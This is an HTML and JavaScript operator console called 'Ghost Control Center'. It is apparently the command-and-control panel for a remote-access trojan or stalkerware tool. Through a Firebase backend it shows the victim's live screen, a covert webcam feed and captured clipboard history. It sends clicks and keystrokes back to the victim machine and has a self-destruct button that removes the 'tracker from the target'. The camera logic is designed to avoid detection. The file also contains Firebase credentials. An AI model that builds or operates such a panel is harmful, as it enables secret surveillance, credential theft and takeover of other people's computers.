<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ghost Control Panel - RealTime</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        #remote-cursor { transition: all 0.1s ease-out; pointer-events: none; z-index: 50; }
        .clipboard-item { @apply bg-slate-800 p-2 rounded text-[11px] border-l-2 border-blue-500 break-all relative animate-in fade-in slide-in-from-right-2; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
        .motion-alert { animation: pulse-red 1s infinite; }
        @keyframes pulse-red { 0%, 100% { background: rgba(220, 38, 38, 0.2); } 50% { background: rgba(220, 38, 38, 0.5); } }
    </style>
</head>
<body class="bg-slate-900 text-white min-h-screen flex flex-col overflow-hidden font-sans">

    <!-- Header Section -->
    <header class="p-4 bg-slate-800 border-b border-slate-700 flex justify-between items-center shrink-0 shadow-xl">
        <div class="flex items-center gap-4">
            <h1 class="font-bold text-lg flex items-center gap-2">
                <span class="bg-red-600 p-1.5 rounded shadow-lg animate-pulse">🔴</span> 
                <span>Ghost Control Center</span>
            </h1>
            <button id="kill-switch" class="bg-red-900/30 hover:bg-red-600 text-red-500 hover:text-white border border-red-900/50 px-3 py-1.5 rounded text-[10px] font-black uppercase transition-all">Self Destruct</button>
        </div>
        <div class="flex items-center gap-3 bg-slate-950 border border-slate-700 px-4 py-1.5 rounded-full text-[10px]">
            <span class="text-slate-500 uppercase tracking-widest">Cam Status:</span>
            <span id="cam-status" class="text-blue-400 font-bold tracking-widest">CONNECTING...</span>
        </div>
    </header>

    <main class="flex-1 flex flex-col md:flex-row overflow-hidden">
        
        <!-- Live Stream Area (Left Side) -->
        <div class="flex-[3] relative bg-black flex flex-col items-center justify-center p-2 overflow-hidden border-r border-slate-800">
            <div id="screen-container" class="relative max-w-full max-h-full border border-slate-700 shadow-2xl cursor-crosshair group">
                <img id="stream-img" src="" class="hidden max-w-full max-h-[82vh] object-contain" draggable="false">
                
                <!-- Real-time Virtual Cursor -->
                <div id="remote-cursor" class="absolute w-5 h-5 hidden">
                    <svg viewBox="0 0 24 24" fill="white" stroke="black" stroke-width="1.5"><path d="M3 3l7.07 16.97 2.51-7.39 7.39-2.51L3 3z"/></svg>
                </div>
            </div>

            <!-- Floating Camera Window (PIP Mode) -->
            <div id="cam-box" class="absolute bottom-6 right-6 w-64 aspect-video bg-slate-800 border-2 border-slate-700 rounded-xl shadow-2xl overflow-hidden">
                <!-- Motion Detected Overlay -->
                <div id="cam-placeholder" class="absolute inset-0 flex flex-col items-center justify-center gap-3 text-center p-4 bg-slate-900 hidden">
                    <span class="text-[10px] text-red-500 font-black tracking-tighter">⚠️ MOTION DETECTED - CAM KILLED</span>
                    <button onclick="resetCamera()" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-1.5 rounded-lg text-[11px] font-bold shadow-lg transition-all">RESTART CAMERA</button>
                </div>
                
                <img id="cam-img" src="" class="absolute inset-0 w-full h-full object-cover hidden">
                
                <div class="absolute top-2 left-2 bg-black/60 px-2 py-0.5 rounded text-[9px] flex items-center gap-1.5">
                    <span id="rec-dot" class="w-2 h-2 bg-slate-500 rounded-full"></span> 
                    <span class="font-bold tracking-tighter uppercase">Live Cam</span>
                </div>
            </div>
        </div>

        <!-- Sidebar (Controls & Logs - Right Side) -->
        <div class="flex-1 bg-slate-800 p-4 flex flex-col gap-6 overflow-y-auto md:w-80">
            
            <!-- Clipboard History -->
            <div class="bg-slate-900 rounded-xl p-4 border border-slate-700 shadow-inner">
                <h3 class="text-[10px] font-black text-blue-400 uppercase tracking-widest mb-4 border-b border-slate-800 pb-2">📋 Remote Clipboard</h3>
                <div id="clipboard-list" class="flex flex-col gap-2 max-h-56 overflow-y-auto pr-1">
                    <div class="text-slate-600 text-[10px] italic">No data yet...</div>
                </div>
            </div>

            <!-- Remote Input Controls -->
            <div class="bg-slate-900 rounded-xl p-4 border border-slate-700 shadow-inner">
                <h3 class="text-[10px] font-black text-green-400 uppercase tracking-widest mb-4 border-b border-slate-800 pb-2">⌨️ Type & Interaction</h3>
                <div class="flex flex-col gap-4">
                    <div class="relative">
                        <input type="text" id="keyboard-input" autocomplete="off" placeholder="Type on remote PC..." 
                            class="w-full bg-slate-800 border border-slate-700 rounded-lg p-2.5 text-sm outline-none focus:border-blue-500 transition-all">
                        <button id="send-btn" class="absolute right-1.5 top-1.5 bg-blue-600 hover:bg-blue-500 px-3 py-1 rounded text-[10px] font-bold">SEND</button>
                    </div>
                    <div class="grid grid-cols-3 gap-2">
                        <button onclick="sendSpecialKey('enter')" class="bg-slate-700 hover:bg-slate-600 p-2 rounded text-[10px] font-bold">Enter</button>
                        <button onclick="sendSpecialKey('backspace')" class="bg-slate-700 hover:bg-slate-600 p-2 rounded text-[10px] font-bold">Del</button>
                        <button onclick="sendSpecialKey('esc')" class="bg-slate-700 hover:bg-slate-600 p-2 rounded text-[10px] font-bold">Esc</button>
                    </div>
                </div>
            </div>

            <!-- Help/Tips -->
            <div class="mt-auto p-3 rounded-lg bg-blue-900/10 border border-blue-900/30">
                <p class="text-[9px] text-blue-400 leading-relaxed">
                    <b>Tip:</b> If the camera stays OFF, ensure no movement is happening in front of the lens. Camera auto-starts after 1 min of complete inactivity.
                </p>
            </div>
        </div>
    </main>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
        import { getFirestore, doc, onSnapshot, collection, addDoc, serverTimestamp, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";

        const firebaseConfig = { 
            apiKey: "AIzaSyDYbGLAXKaY9uVyNPDCS-bvxsQvPWiLouk", 
            authDomain: "sainfoxiya-com-a7733.firebaseapp.com", 
            projectId: "sainfoxiya-com-a7733", 
            appId: "1:639762867502:web:826662477ce123110fc6bf" 
        };

        const appId = "sainfoxiya-com-a7733";
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        const streamImg = document.getElementById('stream-img');
        const camImg = document.getElementById('cam-img');
        const camStatus = document.getElementById('cam-status');
        const screenContainer = document.getElementById('screen-container');
        const remoteCursor = document.getElementById('remote-cursor');
        const keyboardInput = document.getElementById('keyboard-input');
        const camPlaceholder = document.getElementById('cam-placeholder');
        const recDot = document.getElementById('rec-dot');
        const camBox = document.getElementById('cam-box');

        signInAnonymously(auth);
        onAuthStateChanged(auth, (user) => { if(user) startRealtimeSync(); });

        // Remote Action Dispatcher
        async function sendAction(data) {
            await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'actions'), { 
                ...data, timestamp: serverTimestamp(), processed: false 
            });
        }

        // Action Handlers
        window.resetCamera = () => sendAction({ type: 'reset_camera' });
        window.sendSpecialKey = (key) => sendAction({ type: 'special_key', value: key });

        document.getElementById('send-btn').onclick = () => {
            if(!keyboardInput.value.trim()) return;
            sendAction({ type: 'text', value: keyboardInput.value });
            keyboardInput.value = '';
        };

        document.getElementById('kill-switch').onclick = () => {
            if(confirm("ALERT: This will permanently remove the tracker from the target. Proceed?")) 
                sendAction({ type: 'self_destruct' });
        };

        // Capture Screen Click Coordinates
        screenContainer.addEventListener('click', (e) => {
            const rect = screenContainer.getBoundingClientRect();
            sendAction({ 
                type: 'click', 
                relX: (e.clientX - rect.left)/rect.width, 
                relY: (e.clientY - rect.top)/rect.height 
            });
        });

        // LIVE REAL-TIME SYNC (No Refresh Loop)
        function startRealtimeSync() {
            // 1. Live Screen Stream
            onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_screen'), (snap) => {
                if(snap.exists()){
                    const d = snap.data();
                    if(d.frame) {
                        streamImg.src = d.frame;
                        streamImg.classList.remove('hidden');
                    }
                    remoteCursor.style.left = (d.cursorX * 100) + '%';
                    remoteCursor.style.top = (d.cursorY * 100) + '%';
                    remoteCursor.classList.remove('hidden');
                }
            });

            // 2. Live Camera & Motion State
            onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_camera'), (snap) => {
                if(snap.exists()){
                    const d = snap.data();
                    camStatus.innerText = d.status || "IDLE";
                    
                    if(d.frame) {
                        camImg.src = d.frame;
                        camImg.classList.remove('hidden');
                        camPlaceholder.classList.add('hidden');
                        camBox.classList.remove('motion-alert');
                        recDot.className = "w-2 h-2 bg-red-600 rounded-full animate-pulse shadow-[0_0_8px_red]";
                    } else {
                        camImg.classList.add('hidden');
                        camPlaceholder.classList.remove('hidden');
                        recDot.className = "w-2 h-2 bg-slate-500 rounded-full";
                    }

                    if(d.motion) {
                        camStatus.className = "text-red-500 font-black animate-pulse uppercase";
                        camBox.classList.add('motion-alert');
                    } else {
                        camStatus.className = "text-blue-400 font-bold uppercase";
                        camBox.classList.remove('motion-alert');
                    }
                }
            });

            // 3. Live Clipboard Logs
            const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'clipboard'), orderBy('timestamp', 'desc'), limit(8));
            onSnapshot(q, (snap) => {
                const list = document.getElementById('clipboard-list');
                list.innerHTML = '';
                if(snap.empty) list.innerHTML = '<div class="text-slate-600 text-[10px] italic">No active logs...</div>';
                snap.forEach(s => {
                    const item = document.createElement('div');
                    item.className = 'clipboard-item';
                    item.innerText = s.data().text;
                    list.appendChild(item);
                });
            });
        }
    </script>
</body>
</html>
